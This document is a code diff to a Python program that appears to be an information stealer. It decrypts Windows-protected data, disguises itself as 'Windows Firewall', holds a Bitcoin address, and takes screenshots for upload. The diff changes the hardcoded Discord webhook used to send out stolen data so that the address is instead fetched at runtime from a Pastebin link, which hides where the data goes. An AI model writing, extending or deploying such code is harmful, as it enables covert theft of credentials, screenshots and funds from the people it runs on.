@@ -14,6 +14,7 @@ import ctypes
 import sys
 import getpass
 import re
+import requests
 import subprocess
 from os import environ, path
 from win32crypt import CryptUnprotectData
@@ -31,11 +32,12 @@ from base64 import b64decode
 
 # Configuration
 BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v'
-webhookURL = "https://discord.com/api/webhooks/855539723782193163/1U5dlWTeXgleOvtvJgjeNQolC5QkAj_2mZpUt1KeZMiFbAa7OJHqcbhcU6kKzbi1Flkd"
+pastebin = "https://pastebin.com/raw/fiFGQEcy"
 hiddenWindow = False
 FakeFileName = "Windows Firewall"
 
 # Defining needed variables
+webhookURL = requests.get(pastebin).text
 path = path.join(
     environ["USERPROFILE"],
     "AppData",
@@ -184,6 +186,8 @@ class Logger():
         except Exception as e:
             print(e)
     def uploadFiles():
+    	# Get Webhook
+
         # Get screenshot
         try:
             screen = ImageGrab.grab()
